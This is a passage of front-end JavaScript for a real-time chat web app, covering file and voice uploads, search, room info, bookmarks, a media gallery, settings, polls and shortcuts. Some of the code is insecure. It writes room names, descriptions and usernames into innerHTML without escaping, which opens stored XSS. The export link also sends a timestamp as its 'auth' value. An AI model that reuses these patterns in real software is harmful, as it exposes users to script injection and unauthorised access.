    if (file.size > 10 * 1024 * 1024) { showToast('File too large (max 10MB)', 'error'); return; }
    const reader = new FileReader();
    reader.onload = () => {
      const base64 = reader.result.split(',')[1];
      fetch('/api/upload', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ file: base64, fileName: file.name, mimeType: file.type }) })
        .then(r => r.json()).then(d => {
          if (d.url) {
            state.pendingFile = d;
            $('messageInput').value = $('messageInput').value + ' ';
            $('messageInput').focus();
            showToast('File attached: ' + file.name);
            if (!file.type.startsWith('image/')) sendMessage();
            else { sendMessage(); }
          }
        }).catch(() => showToast('Upload failed', 'error'));
    };
    reader.readAsDataURL(file);
  };
  input.click();
});

// VOICE RECORDING
let mediaRecorder = null; let audioChunks = [];
$('voiceBtn').addEventListener('click', async () => {
  try {
    if (mediaRecorder && mediaRecorder.state === 'recording') {
      mediaRecorder.stop(); $('voiceBtn').style.color = ''; return;
    }
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
    audioChunks = [];
    mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
    mediaRecorder.onstop = () => {
      const blob = new Blob(audioChunks, { type: 'audio/webm' });
      const reader = new FileReader();
      reader.onload = () => {
        const base64 = reader.result.split(',')[1];
        fetch('/api/upload', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ file: base64, fileName: 'voice.webm', mimeType: 'audio/webm' }) })
          .then(r => r.json()).then(d => {
            if (d.url) socket.emit('send-message', { roomId: state.currentRoom, text: '🎤 Voice message', replyTo: state.replyTo, fileData: d, isVoice: true });
          });
      };
      reader.readAsDataURL(blob);
      stream.getTracks().forEach(t => t.stop());
    };
    mediaRecorder.start();
    $('voiceBtn').style.color = 'var(--danger)';
    showToast('Recording... tap again to stop');
  } catch(e) { showToast('Voice not available', 'error'); }
});

// PINNED BAR
function updatePinnedBar() {
  const bar = $('pinnedBar');
  const pinned = state.pinnedMessages[state.currentRoom] || [];
  if (pinned.length) {
    const msg = state.messages[state.currentRoom]?.find(m => m.id === pinned[pinned.length - 1]);
    if (msg) { $('pinnedText').textContent = msg.text.slice(0, 80); bar.classList.remove('hidden'); return; }
  }
  bar.classList.add('hidden');
}

$('unpinBtn').addEventListener('click', () => {
  const pinned = state.pinnedMessages[state.currentRoom] || [];
  if (pinned.length) socket.emit('unpin-message', { roomId: state.currentRoom, messageId: pinned[pinned.length - 1] });
});

// SEARCH
$('searchToggle').addEventListener('click', () => { $('searchBar').classList.toggle('hidden'); if (!$('searchBar').classList.contains('hidden')) $('globalSearch').focus(); });
$('clearSearch').addEventListener('click', () => { $('globalSearch').value = ''; $('searchBar').classList.add('hidden'); $('searchResultsBar').classList.add('hidden'); renderMessages(state.messages[state.currentRoom] || []); });
$('closeSearchResults').addEventListener('click', () => { $('searchResultsBar').classList.add('hidden'); renderMessages(state.messages[state.currentRoom] || []); });

let searchTimeout = null;
$('globalSearch').addEventListener('input', () => {
  clearTimeout(searchTimeout);
  const q = $('globalSearch').value.trim();
  if (!q) { $('searchResultsBar').classList.add('hidden'); renderMessages(state.messages[state.currentRoom] || []); return; }
  searchTimeout = setTimeout(() => {
    if (state.currentRoom) socket.emit('search-messages', { roomId: state.currentRoom, query: q });
    else {
      const results = Object.values(state.messages).flat().filter(m => m.text?.toLowerCase().includes(q.toLowerCase())).slice(0, 30);
      showToast(`Found ${results.length} results`);
    }
  }, 400);
});

function renderSearchResults(results) {
  const area = $('messagesArea');
  if (!results.length) { area.innerHTML = '<div class="empty-chat">No results</div>'; return; }
  area.innerHTML = results.map(m => {
    const el = document.createElement('div');
    el.innerHTML = messageHTML(m);
    return el.innerHTML;
  }).join('');
}

// ROOM INFO
$('roomInfoBtn').addEventListener('click', () => {
  const room = state.rooms[state.currentRoom];
  if (!room) return;
  const pinned = state.pinnedMessages[state.currentRoom] || [];
  const content = $('roomInfoContent');
  content.innerHTML = `
    <div style="margin-bottom:12px;"><strong>Name:</strong> ${room.name}</div>
    <div style="margin-bottom:12px;"><strong>Type:</strong> ${room.type}</div>
    <div style="margin-bottom:12px;"><strong>Description:</strong> ${room.description || 'None'}</div>
    <div style="margin-bottom:12px;"><strong>Members (${room.members?.length || 0}):</strong> ${room.members?.map(m => state.users[m]?.username || m).join(', ') || 'None'}</div>
    <div style="margin-bottom:12px;"><strong>Moderators:</strong> ${room.moderators?.map(m => state.users[m]?.username || m).join(', ') || 'None'}</div>
    <div style="margin-bottom:12px;"><strong>Pinned messages:</strong> ${pinned.length}</div>
    <div style="margin-bottom:12px;"><strong>Slow mode:</strong> ${room.slowMode || 0}s</div>
    <div style="margin-bottom:12px;"><strong>Created:</strong> ${new Date(room.createdAt).toLocaleString()}</div>
    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:8px;">
      <button class="btn-primary" style="width:auto;padding:8px 16px;font-size:12px;" onclick="generateInvite()"><i class="fas fa-link"></i> Invite</button>
      <button class="btn-primary" style="width:auto;padding:8px 16px;font-size:12px;background:var(--bg-tertiary);color:var(--text-primary);" onclick="exportChat()"><i class="fas fa-download"></i> Export</button>
    </div>
  `;
  $('roomInfoTitle').textContent = room.name;
  $('roomInfoModal').classList.remove('hidden');
});

function generateInvite() { socket.emit('generate-invite', { roomId: state.currentRoom }); }
function exportChat() { window.open(`/api/export/${state.currentRoom}?auth=${Date.now()}`, '_blank'); }

// MORE PANEL ACTIONS
document.querySelectorAll('.more-item').forEach(item => {
  item.addEventListener('click', () => {
    const a = item.dataset.action;
    if (a === 'bookmarks') { $('bookmarksModal').classList.remove('hidden'); renderBookmarks(); }
    else if (a === 'gallery') { $('galleryModal').classList.remove('hidden'); renderGallery(); }
    else if (a === 'streaks') showToast(`🔥 Streak: ${state.streaks[state.userId]?.count || 0} days!`);
    else if (a === 'shortcuts') $('shortcutsModal').classList.remove('hidden');
    else if (a === 'settings') $('settingsModal').classList.remove('hidden');
    else if (a === 'feedback') $('feedbackModal').classList.remove('hidden');
    else if (a === 'help') socket.emit('command', { roomId: state.currentRoom || 'global', cmd: 'help' });
  });
});

// BOOKMARKS
function renderBookmarks() {
  const list = $('bookmarksList');
  const msgs = state.bookmarks.map(id => {
    for (const [roomId, ms] of Object.entries(state.messages)) {
      const m = ms.find(x => x.id === id);
      if (m) return { ...m, roomId };
    }
    return null;
  }).filter(Boolean);
  list.innerHTML = msgs.length ? msgs.map(m => `<div class="msg-preview" onclick="joinRoom('${m.roomId}')"><div class="m-user">${m.username}</div><div class="m-text">${escapeHtml(m.text.slice(0,100))}</div></div>`).join('') : '<div style="color:var(--text-secondary);text-align:center;padding:20px;">No bookmarks yet</div>';
}

// GALLERY
function renderGallery() {
  const grid = $('galleryGrid');
  const images = [];
  for (const [, msgs] of Object.entries(state.messages)) {
    msgs.filter(m => m.file?.type?.startsWith('image/')).forEach(m => images.push(m.file.url));
  }
  grid.innerHTML = images.length ? images.map(url => `<img src="${url}" loading="lazy" onclick="window.open('${url}')">`).join('') : '<div style="color:var(--text-secondary);grid-column:1/-1;text-align:center;padding:40px;">No media yet</div>';
}

// NOTIFICATIONS
function playNotify() {
  if (state.settings.notifSound === false || document.hidden === false) return;
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = ctx.createOscillator(); const gain = ctx.createGain();
    osc.connect(gain); gain.connect(ctx.destination);
    osc.frequency.value = 600; gain.gain.value = 0.08;
    osc.start(); osc.stop(ctx.currentTime + 0.08);
  } catch(e) {}
}

// TOAST
function showToast(msg, type = 'info') {
  const t = document.createElement('div');
  t.className = 'toast ' + type;
  t.textContent = msg;
  document.body.appendChild(t);
  setTimeout(() => t.remove(), 3000);
}

// CONFIRM
function showConfirm(title, cb) {
  $('confirmTitle').textContent = title;
  $('confirmYes').onclick = () => { cb(); $('confirmModal').classList.add('hidden'); };
  $('confirmNo').onclick = () => $('confirmModal').classList.add('hidden');
  $('confirmModal').classList.remove('hidden');
}

// LEAVE ROOM
function leaveRoom() {
  state.currentRoom = null;
  $('chatView').classList.add('hidden');
  $('welcomeScreen').classList.remove('hidden');
  document.getElementById('app').classList.remove('chat-open');
}

// HELPERS
function escapeHtml(text) {
  const d = document.createElement('div');
  d.textContent = text;
  return d.innerHTML;
}

function formatTime(ts) {
  if (!ts) return '';
  const d = new Date(ts);
  const opts = { hour: '2-digit', minute: '2-digit' };
  if (state.settings.time24h) opts.hour12 = false;
  return d.toLocaleTimeString([], opts);
}

function timeAgo(ts) {
  const diff = Date.now() - (ts || 0);
  if (diff < 60000) return 'just now';
  if (diff < 3600000) return Math.floor(diff / 60000) + 'm ago';
  if (diff < 86400000) return Math.floor(diff / 3600000) + 'h ago';
  return Math.floor(diff / 86400000) + 'd ago';
}

function scrollToBottom() {
  setTimeout(() => {
    const area = $('messagesArea');
    area.scrollTop = area.scrollHeight;
  }, 50);
}

function updateSidebarPreview(roomId, msg) {
  const el = document.querySelector(`[data-room="${roomId}"] .item-preview`);
  if (el) el.textContent = `${msg.username}: ${(msg.text || '📎 file').slice(0, 30)}`;
}

function updateMyUI() {
  const u = state.users[state.userId];
  if (u) {
    $('myName').textContent = u.username;
    $('userAvatar').textContent = u.username?.[0]?.toUpperCase() || 'U';
    $('myStatus').textContent = u.customStatus || u.status || 'online';
    $('myStatus').style.color = u.status === 'away' ? 'var(--warning)' : u.status === 'busy' ? 'var(--danger)' : 'var(--success)';
  }
}

// SETTINGS
['time24h','enterSend','notifSound','showTyping'].forEach(k => {
  const el = $(k);
  if (el) el.addEventListener('change', () => {
    state.settings[k] = el.checked;
    localStorage.setItem('cw-settings', JSON.stringify(state.settings));
  });
});

$('fontSizeSlider')?.addEventListener('input', () => {
  const v = $('fontSizeSlider').value;
  document.documentElement.style.setProperty('--font-size', v + 'px');
  $('fontSizeLabel').textContent = v + 'px';
  state.settings.fontSize = parseInt(v);
  localStorage.setItem('cw-settings', JSON.stringify(state.settings));
});

document.querySelectorAll('.bg-option').forEach(el => {
  el.addEventListener('click', () => {
    document.querySelectorAll('.bg-option').forEach(b => b.classList.remove('active'));
    el.classList.add('active');
    const bg = el.dataset.bg;
    if (bg === 'default') { document.documentElement.style.setProperty('--chat-bg', 'transparent'); delete state.settings.background; }
    else { document.documentElement.style.setProperty('--chat-bg', bg); state.settings.background = bg; }
    localStorage.setItem('cw-settings', JSON.stringify(state.settings));
    if (state.currentRoom) socket.emit('update-room-settings', { roomId: state.currentRoom, settings: { background: bg === 'default' ? null : bg } });
  });
});

// TAB SWITCHING
document.querySelectorAll('.tab-btn').forEach(btn => {
  btn.addEventListener('click', () => {
    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('.sidebar-content').forEach(c => c.classList.remove('active'));
    btn.classList.add('active');
    const tab = btn.dataset.tab;
    state.activeTab = tab;
    const map = { chats: 'chatList', rooms: 'roomList', people: 'peopleList', more: 'morePanel' };
    $(map[tab]).classList.add('active');
    if (tab === 'chats') renderChats();
    if (tab === 'rooms') renderRooms();
    if (tab === 'people') renderPeople();
  });
});

// THEME
$('themeToggle').addEventListener('click', () => {
  state.theme = state.theme === 'dark' ? 'light' : 'dark';
  document.documentElement.setAttribute('data-theme', state.theme);
  localStorage.setItem('cw-theme', state.theme);
  $('themeToggle').innerHTML = state.theme === 'dark' ? '<i class="fas fa-moon"></i>' : '<i class="fas fa-sun"></i>';
});

// ROOM MODAL
$('newRoomBtn').addEventListener('click', () => $('roomModal').classList.remove('hidden'));
$('quickCreateBtn')?.addEventListener('click', () => $('roomModal').classList.remove('hidden'));
document.querySelectorAll('.modal-close').forEach(el => el.addEventListener('click', () => el.closest('.modal').classList.add('hidden')));
document.querySelectorAll('.modal').forEach(el => el.addEventListener('click', (e) => { if (e.target === el) el.classList.add('hidden'); }));

$('createRoomSubmit').addEventListener('click', () => {
  const name = $('roomNameInput').value.trim();
  const type = $('roomTypeSelect').value;
  const desc = $('roomDescInput').value.trim();
  const welcome = $('roomWelcomeInput').value.trim();
  if (!name) { showToast('Enter a room name', 'error'); return; }
  socket.emit('create-room', { name, type, description: desc, welcomeMsg: welcome });
  $('roomNameInput').value = ''; $('roomDescInput').value = ''; $('roomWelcomeInput').value = '';
  $('roomModal').classList.add('hidden');
});

// EMOJI
$('emojiBtn').addEventListener('click', (e) => { e.stopPropagation(); $('emojiPicker').classList.toggle('hidden'); renderEmojis('smileys'); });
document.addEventListener('click', () => $('emojiPicker').classList.add('hidden'));

document.querySelectorAll('.emoji-tab').forEach(tab => {
  tab.addEventListener('click', () => {
    document.querySelectorAll('.emoji-tab').forEach(t => t.classList.remove('active'));
    tab.classList.add('active');
    renderEmojis(tab.dataset.cat);
  });
});

function renderEmojis(cat) {
  const emojis = EMOJI[cat] || EMOJI.smileys;
  $('emojiGrid').innerHTML = emojis.map(e => `<span>${e}</span>`).join('');
  $('emojiGrid').querySelectorAll('span').forEach(el => {
    el.addEventListener('click', () => {
      $('messageInput').value += el.textContent;
      $('messageInput').focus();
    });
  });
}
renderEmojis('smileys');

// POLL MODAL
$('pollBtn').addEventListener('click', () => $('pollModal').classList.remove('hidden'));
$('addPollOption').addEventListener('click', () => {
  const container = $('pollOptions');
  const count = container.querySelectorAll('.poll-option').length + 1;
  if (count > 8) { showToast('Max 8 options', 'error'); return; }
  const input = document.createElement('input');
  input.type = 'text'; input.className = 'poll-option'; input.placeholder = `Option ${count}`; input.maxLength = 100;
  container.appendChild(input);
});
$('createPollSubmit').addEventListener('click', () => {
  const q = $('pollQuestion').value.trim();
  const opts = Array.from(document.querySelectorAll('.poll-option')).map(i => i.value.trim()).filter(Boolean);
  if (!q || opts.length < 2) { showToast('Need question and 2+ options', 'error'); return; }
  socket.emit('create-poll', { roomId: state.currentRoom, question: q, options: opts });
  $('pollQuestion').value = ''; document.querySelectorAll('.poll-option').forEach(i => i.value = '');
  $('pollModal').classList.add('hidden');
});

// STATUS
$('statusBtn').addEventListener('click', () => $('statusModal').classList.remove('hidden'));
document.querySelectorAll('.status-option').forEach(el => {
  el.addEventListener('click', () => {
    document.querySelectorAll('.status-option').forEach(s => s.classList.remove('active'));
    el.classList.add('active');
  });
});
$('setStatusBtn').addEventListener('click', () => {
  const active = document.querySelector('.status-option.active');
  const status = active?.dataset?.status || 'online';
  const custom = $('customStatusInput').value.trim();
  socket.emit('set-status', { status, customStatus: custom });
  $('statusModal').classList.add('hidden');
  showToast(`Status set to ${status}`);
});

// FEEDBACK
$('submitFeedback').addEventListener('click', () => {
  const text = $('feedbackText').value.trim();
  if (!text) { showToast('Enter feedback', 'error'); return; }
  socket.emit('send-feedback', { text, type: $('feedbackType').value });
  $('feedbackText').value = '';
});

// KEYBOARD SHORTCUTS
document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape') {
    document.querySelectorAll('.modal:not(.hidden)').forEach(m => m.classList.add('hidden'));
    cancelReply(); $('contextMenu').classList.add('hidden'); $('reactionPicker').classList.add('hidden');
  }
  if ((e.ctrlKey || e.metaKey) && e.key === 'k') { e.preventDefault(); $('searchToggle').click(); }
  if ((e.ctrlKey || e.metaKey) && e.key === 'n') { e.preventDefault(); $('newRoomBtn').click(); }
  if ((e.ctrlKey || e.metaKey) && e.key === 'ArrowUp') {
    e.preventDefault();
    const msgs = state.messages[state.currentRoom]?.filter(m => m.userId === state.userId) || [];
    if (msgs.length) startEdit(msgs[msgs.length - 1].id);
  }
});

// CLICK OUTSIDE REACTION PICKER
document.addEventListener('click', (e) => {
  if (!$('reactionPicker').classList.contains('hidden') && !e.target.closest('.reaction-picker') && !e.target.closest('.pill-actions')) {
    $('reactionPicker').classList.add('hidden');
  }
});

// ACTION FUNCTIONS
function joinRoom(roomId) { socket.emit('join-room', roomId); }
function startPersonalChat(targetId) { socket.emit('start-personal', targetId); }
function mentionUser(name) { $('messageInput').value += '@' + name + ' '; $('messageInput').focus(); }

// SCROLL TO BOTTOM BUTTON
(function() {
  const area = $('messagesArea');
  if (!area) return;
  area.addEventListener('scroll', () => {
    const btn = document.getElementById('scrollBottomBtn') || (() => { const b = document.createElement('button'); b.id = 'scrollBottomBtn'; b.innerHTML = '<i class="fas fa-chevron-down"></i>'; b.onclick = scrollToBottom; document.getElementById('mainArea')?.appendChild(b); return b; })();
    const nearBottom = area.scrollHeight - area.scrollTop - area.clientHeight < 200;
    btn.classList.toggle('show', !nearBottom);
  });
})();

// INITIAL RENDER
updateMyUI();
